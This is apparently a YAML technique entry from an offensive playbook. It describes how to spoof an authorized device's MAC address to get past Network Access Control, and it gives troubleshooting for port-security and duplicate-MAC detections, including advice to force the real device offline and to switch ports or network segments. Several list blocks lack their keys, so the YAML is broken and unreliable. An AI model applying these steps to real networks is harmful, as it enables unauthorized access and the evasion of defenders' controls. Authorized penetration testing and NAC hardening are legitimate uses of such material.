description: Clone MAC address of an authorized device to bypass Network Access Control.
detailed_description: |
  Bypass NAC systems by identifying and spoofing the MAC address of an authorized device.
  This technique exploits weak NAC implementations that rely solely on MAC address authentication.

  - nac_present
  - physical_access

  - authorized_device_identified
  - target_device_offline

issues:
  - symptom: Port security violation
    severity: high
    causes:
      - Sticky MAC configured
      - Maximum MAC addresses exceeded
      - Port shutdown on violation
    resolutions:
      - Wait for port security aging time
      - Try different switch port
      - Force target device disconnect first

  - symptom: Duplicate MAC detected
    severity: high
    causes:
      - Target device still online
      - Switch detects duplicate
      - Spanning tree issues
    resolutions:
      - Ensure target device offline
      - Wait for ARP cache timeout
      - Try from different network segment

  - symptom: Adapter doesn't support MAC change
    severity: medium
    causes:
      - Hardware limitation
      - Driver restriction
      - Virtual adapter
    resolutions:
      - Use different network adapter
      - Try alternative spoofing method
      - Use USB ethernet adapter

cleanup:
  - priority: high
    action: Restore original MAC address

    - MAC address successfully changed
    - Network access obtained
    - Restricted resources accessible
    - No port security violations

  failure_indicators:
    - Port security violation triggered
    - Duplicate MAC detected
    - NAC performs additional checks
    - Certificate validation required
